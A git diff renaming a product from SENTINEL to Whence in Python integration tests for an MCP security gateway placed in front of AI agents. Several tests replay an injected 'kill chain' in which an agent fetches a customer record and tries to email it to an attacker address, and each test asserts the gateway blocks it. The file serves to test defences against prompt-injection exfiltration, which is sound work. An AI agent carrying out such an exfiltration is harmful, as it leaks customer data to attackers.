@@ -1,14 +1,14 @@
 """Phase 9 DoD — the MCP-over-HTTP wire transport, proven end-to-end.
 
 These tests do something none of the earlier phases could: they connect a REAL,
-independent MCP client to SENTINEL over a REAL TCP socket (a uvicorn server on an
+independent MCP client to Whence over a REAL TCP socket (a uvicorn server on an
 ephemeral port) and drive the hero kill chain through it. This is the proof that
-SENTINEL is something you can put in front of YOUR agent — the agent↔SENTINEL hop
+Whence is something you can put in front of YOUR agent — the agent↔Whence hop
 is genuine HTTP/MCP, not an in-process stream — and that the SAME pipeline
 (provenance → authorization → trust → forensics) secures it.
 
 The client here is ``mcp.client.streamable_http`` from the upstream SDK: it knows
-nothing about SENTINEL. To it, SENTINEL is just an MCP server exposing tools.
+nothing about Whence. To it, Whence is just an MCP server exposing tools.
 """
 from __future__ import annotations
 
@@ -26,18 +26,18 @@ from mcp import ClientSession
 from mcp.client.streamable_http import streamable_http_client
 from starlette.applications import Starlette
 
-from sentinel.config import reset_settings_cache
-from sentinel.control.app import create_app
-from sentinel.control.manager import RunManager
-from sentinel.control.mcp_gateway import SentinelGateway
-from sentinel.demo.tool_servers import (
+from whence.config import reset_settings_cache
+from whence.control.app import create_app
+from whence.control.manager import RunManager
+from whence.control.mcp_gateway import WhenceGateway
+from whence.demo.tool_servers import (
     ATTACKER_ADDRESS,
     OBVIOUS_URL,
     ToolServerState,
     build_downstream,
 )
-from sentinel.forensics.store import InMemoryForensicStore
-from sentinel.mcp_proxy.content import result_text
+from whence.forensics.store import InMemoryForensicStore
+from whence.mcp_proxy.content import result_text
 
 # This is a real socket integration: a few teardown-time ResourceWarnings from
 # the HTTP stack are environmental noise, not product defects. The suite runs
@@ -153,7 +153,7 @@ async def test_external_mcp_client_over_http_is_secured() -> None:
             async with ClientSession(read, write) as session:
                 await session.initialize()
 
-                # 1. Discovery: SENTINEL presents the downstream catalogue.
+                # 1. Discovery: Whence presents the downstream catalogue.
                 listed = await session.list_tools()
                 names = {tool.name for tool in listed.tools}
                 assert {"get_customer_record", "web_fetch", "send_email"} <= names
@@ -177,7 +177,7 @@ async def test_external_mcp_client_over_http_is_secured() -> None:
                     },
                 )
                 assert blocked.isError
-                assert "SENTINEL blocked" in result_text(blocked)
+                assert "Whence blocked" in result_text(blocked)
 
         # 5. Nothing actually left the building: the mock outbox is empty.
         gateway = app.state.gateway
@@ -199,7 +199,7 @@ async def test_external_mcp_client_over_http_is_secured() -> None:
 async def test_two_wire_sessions_are_isolated_traces() -> None:
     """Two independent MCP connections → two separate traces / agents.
 
-    Proves the gateway gives each MCP session its own SentinelProxy (one session
+    Proves the gateway gives each MCP session its own WhenceProxy (one session
     == one trace), so concurrent external clients don't share provenance or trust.
     """
     manager = RunManager(store=InMemoryForensicStore())
@@ -228,7 +228,7 @@ async def test_bare_app_has_no_wire_gateway() -> None:
     assert not any(str(p).startswith("/mcp") for p in mounted)
 
 
-def _gateway_only_app(gateway: SentinelGateway) -> FastAPI:
+def _gateway_only_app(gateway: WhenceGateway) -> FastAPI:
     """A minimal app that mounts ONE gateway (so a test can set max_sessions)."""
 
     @asynccontextmanager
@@ -254,7 +254,7 @@ async def test_capacity_pressure_cannot_launder_provenance() -> None:
     arrival and the exfiltration stays blocked.
     """
     manager = RunManager(store=InMemoryForensicStore())
-    gateway = SentinelGateway(manager, max_sessions=1)  # capacity of exactly one
+    gateway = WhenceGateway(manager, max_sessions=1)  # capacity of exactly one
     app = _gateway_only_app(gateway)
 
     async with _RunningServer(app) as server:
@@ -283,7 +283,7 @@ async def test_capacity_pressure_cannot_launder_provenance() -> None:
                      "body": result_text(record)},
                 )
                 assert blocked.isError
-                assert "SENTINEL blocked" in result_text(blocked)
+                assert "Whence blocked" in result_text(blocked)
 
         # Nothing was laundered out to the shared outbox.
         assert gateway.outbox == []
@@ -315,7 +315,7 @@ async def test_closed_sessions_release_capacity() -> None:
     stimulus, and it stays deterministic instead of depending on socket teardown.
     """
     manager = RunManager(store=InMemoryForensicStore())
-    gateway = SentinelGateway(manager, max_sessions=2)
+    gateway = WhenceGateway(manager, max_sessions=2)
     async with gateway:
         # Five times the cap, one at a time — concurrency never exceeds one.
         for _ in range(10):
@@ -352,7 +352,7 @@ async def test_idle_retirement_refuses_rather_than_reseeds() -> None:
     tainted action through clean. It is refused instead.
     """
     manager = RunManager(store=InMemoryForensicStore())
-    gateway = SentinelGateway(manager, max_sessions=1, idle_ttl=0.0)
+    gateway = WhenceGateway(manager, max_sessions=1, idle_ttl=0.0)
     async with gateway:
         stale = _FakeSession()
         assert await gateway._proxy_for_session(stale) is not None  # type: ignore[arg-type]
@@ -368,12 +368,12 @@ async def test_idle_retirement_refuses_rather_than_reseeds() -> None:
 async def test_mcp_requires_bearer_token_when_configured(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
-    """When SENTINEL_API_TOKEN is set, /mcp refuses unauthenticated clients.
+    """When WHENCE_API_TOKEN is set, /mcp refuses unauthenticated clients.
 
     The wire endpoint must not be an open tool server on a public deploy: no
     token -> the connection is refused; the correct bearer -> it works.
     """
-    monkeypatch.setenv("SENTINEL_API_TOKEN", "s3cr3t-wire-token")
+    monkeypatch.setenv("WHENCE_API_TOKEN", "s3cr3t-wire-token")
     reset_settings_cache()
     try:
         manager = RunManager(store=InMemoryForensicStore())
@@ -403,7 +403,7 @@ async def test_mcp_requires_bearer_token_when_configured(
                     tools = await session.list_tools()
                     assert any(t.name == "send_email" for t in tools.tools)
     finally:
-        monkeypatch.delenv("SENTINEL_API_TOKEN", raising=False)
+        monkeypatch.delenv("WHENCE_API_TOKEN", raising=False)
         reset_settings_cache()
 
 
@@ -426,13 +426,13 @@ async def test_remote_http_tool_servers_are_secured(
             key: await stack.enter_async_context(_RunningServer(srv.streamable_http_app()))
             for key, srv in servers.items()
         }
-        monkeypatch.setenv("SENTINEL_TOOLS_WEB_URL", f"http://127.0.0.1:{runners['web'].port}/mcp")
-        monkeypatch.setenv("SENTINEL_TOOLS_EMAIL_URL", f"http://127.0.0.1:{runners['email'].port}/mcp")
-        monkeypatch.setenv("SENTINEL_TOOLS_RECORDS_URL", f"http://127.0.0.1:{runners['records'].port}/mcp")
+        monkeypatch.setenv("WHENCE_TOOLS_WEB_URL", f"http://127.0.0.1:{runners['web'].port}/mcp")
+        monkeypatch.setenv("WHENCE_TOOLS_EMAIL_URL", f"http://127.0.0.1:{runners['email'].port}/mcp")
+        monkeypatch.setenv("WHENCE_TOOLS_RECORDS_URL", f"http://127.0.0.1:{runners['records'].port}/mcp")
         reset_settings_cache()
         try:
             manager = RunManager(store=InMemoryForensicStore())
-            gateway = SentinelGateway(manager)
+            gateway = WhenceGateway(manager)
             gw = await stack.enter_async_context(_RunningServer(_gateway_only_app(gateway)))
             # The gateway connected over HTTP, not in-memory.
             assert gateway.downstream_mode == "remote-http"
@@ -451,7 +451,7 @@ async def test_remote_http_tool_servers_are_secured(
                         {"to": ATTACKER_ADDRESS, "subject": "x", "body": result_text(record)},
                     )
                     assert blocked.isError
-                    assert "SENTINEL blocked" in result_text(blocked)
+                    assert "Whence blocked" in result_text(blocked)
             # The remote email tool server received nothing — the exfil was stopped
             # at the proxy, before the second (now real HTTP) MCP hop.
             assert state.outbox == []
@@ -484,7 +484,7 @@ async def test_concurrent_runners_get_distinct_working_ports() -> None:
 @pytest.mark.xfail(
     strict=True,
     reason="UNRESOLVED streamable-HTTP teardown wedge, not yet attributed to "
-           "SENTINEL or upstream; see docs/mcp-streamable-http-teardown.md. "
+           "Whence or upstream; see docs/mcp-streamable-http-teardown.md. "
            "strict=True so an XPASS fails CI and forces this marker's removal.",
 )
 async def test_real_http_sessions_after_remote_downstream() -> None:
